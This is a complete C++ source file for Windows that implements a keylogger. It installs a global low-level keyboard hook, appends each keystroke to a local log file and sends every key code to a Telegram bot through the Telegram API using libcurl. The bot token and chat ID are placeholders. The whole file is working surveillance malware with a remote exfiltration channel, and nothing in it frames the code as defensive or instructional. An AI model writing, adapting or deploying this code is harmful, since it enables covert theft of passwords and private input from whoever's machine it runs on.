#include <Windows.h>
#include <curl/curl.h>
#include <fstream>
#include <iostream>

// Telegram bot token and chat ID
const std::string BOT_TOKEN = "BOT_TOKEN";
const std::string CHAT_ID = "CHAT_ID";
const std::string LOG_FILE_PATH = "input_log.txt";

// Callback function for cURL to write the server response
size_t WriteCallback(void* contents, size_t size, size_t nmemb,
    std::string* response)
{
    size_t totalSize = size * nmemb;
    response->append((char*)contents, totalSize);
    return totalSize;
}

// Function to send message to Telegram bot
void SendMessageToTelegram(const std::string& message)
{
    // Initialize cURL
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();

    if (curl) {
        std::string sendMessageUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        std::string postData = "chat_id=" + CHAT_ID + "&text=" + message;

        curl_easy_setopt(curl, CURLOPT_URL, sendMessageUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        // Perform the request
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res)
                      << std::endl;
        } else {
            std::cout << "Message sent successfully!" << std::endl;
            std::cout << "Server response: " << response << std::endl;
        }

        // Clean up
        curl_easy_cleanup(curl);
        curl_global_cleanup();
    }
}

// Function to handle keyboard input
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboardHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboardHookStruct->vkCode;

        // Log input to a text file
        std::ofstream logFile(LOG_FILE_PATH, std::ios::app);
        if (logFile.is_open()) {
            logFile << "Key Pressed: " << vkCode << std::endl;
            logFile.close();
        } else {
            std::cerr << "Failed to open log file!" << std::endl;
        }

        // Send message to Telegram bot
        std::string message = "Key Pressed: " + std::to_string(vkCode);
        SendMessageToTelegram(message);
    }

    // Call the next hook procedure in the hook chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    // Install keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        std::cerr << "Failed to install keyboard hook!" << std::endl;
        return 1;
    }

    // Start message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Uninstall keyboard hook
    UnhookWindowsHookEx(keyboardHook);

    return 0;
}
